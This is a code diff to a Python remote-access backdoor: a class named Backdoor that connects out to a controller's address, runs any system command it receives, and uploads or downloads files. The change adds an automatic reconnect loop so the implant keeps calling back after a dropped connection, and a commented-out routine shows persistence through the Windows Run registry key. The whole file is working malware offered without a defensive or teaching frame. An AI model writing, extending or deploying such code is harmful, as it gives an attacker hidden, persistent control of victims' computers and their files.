@@ -6,6 +6,9 @@ import json
 import os
 import base64
 import sys
+from time import sleep
+import multiprocessing
+from ctypes import c_bool
 import shutil
 
 
@@ -32,8 +35,9 @@ def write_file(path, content):
 class Backdoor:
     def __init__(self, ip, port):
         # self.become_persistent()
-        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # create a socket object
-        self.connection.connect((ip, port))                                  # connect to specified ip/port
+        self.ip = ip
+        self.port = port
+        self.connected = multiprocessing.Value(c_bool, False)
 
     # function that copies the executable file to a specific path and makes it run on startup of system
     # def become_persistent(self):
@@ -43,6 +47,19 @@ class Backdoor:
     #         # add this executable on system startup
     #         subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "'
     #                         + evil_file_location + '"', shell=True)
+
+    def reconnect(self):
+        try:
+            self.connection.close()
+        except Exception:
+            pass
+        sleep(5)
+        try:
+            self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            self.connection.connect((self.ip, self.port))
+            self.connected.value = True
+        except Exception:
+            self.connected.value = False
 
     # function that sends json objects through socket connection
     def reliable_send(self, data):
@@ -66,27 +83,33 @@ class Backdoor:
 
     def run(self):
         while True:
-            command = self.reliable_receive()
-
-            try:
-                if command[0] == "exit":
-                    pass
-                elif command[0] == "killconnection":
-                    self.connection.close()
-                    sys.exit()
-                elif command[0] == "PING":
-                    command_result = "PONG"
-                elif command[0] == "cd" and len(command) > 1:
-                    command_result = change_working_directory_to(command[1])
-                elif command[0] == "download":
-                    command_result = read_file(command[1])
-                elif command[0] == "upload":
-                    command_result = write_file(command[1], command[2])
-                else:
-                    command_result = execute_system_command(command)
-            except Exception:
-                command_result = "[-] Error during command execution."
-            self.reliable_send(command_result)
+            while not self.connected.value:
+                self.reconnect()
+            while True:
+                try:
+                    command = self.reliable_receive()
+                    try:
+                        if command[0] == "exit":
+                            pass
+                        elif command[0] == "killconnection":
+                            self.connected.value = False
+                            break
+                        elif command[0] == "PING":
+                            command_result = "PONG"
+                        elif command[0] == "cd" and len(command) > 1:
+                            command_result = change_working_directory_to(command[1])
+                        elif command[0] == "download":
+                            command_result = read_file(command[1])
+                        elif command[0] == "upload":
+                            command_result = write_file(command[1], command[2])
+                        else:
+                            command_result = execute_system_command(command)
+                    except Exception:
+                        command_result = "[-] Error during command execution."
+                    self.reliable_send(command_result)
+                except OSError:
+                    self.connected.value = False
+                    break
 
 
 try:
